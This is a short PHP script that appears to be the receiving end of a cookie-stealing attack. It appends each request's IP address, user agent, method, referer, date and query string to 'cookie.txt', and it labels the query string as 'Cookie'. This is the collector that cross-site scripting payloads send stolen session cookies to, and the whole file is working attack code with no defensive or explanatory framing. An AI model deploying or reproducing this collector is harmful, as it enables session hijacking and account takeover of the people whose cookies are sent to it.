<?php

$ua = @$_SERVER["HTTP_USER_AGENT"];

$client_ip = @$_SERVER["REMOTE_ADDR"];

$method = @$_SERVER["REQUEST_METHOD"];

$referer = @$_SERVER["HTTP_REFERER"];

$date = date("F j, Y, g:i a");

$querystring = @$_SERVER["QUERY_STRING"];

$log = @fopen("cookie.txt","a+");

$str= "IP: $client_ip |Useragent: $ua | Method: $method | REF: $referer | Date: $date | Cookie: $querystring \n";

@fwrite($log,$str);

?>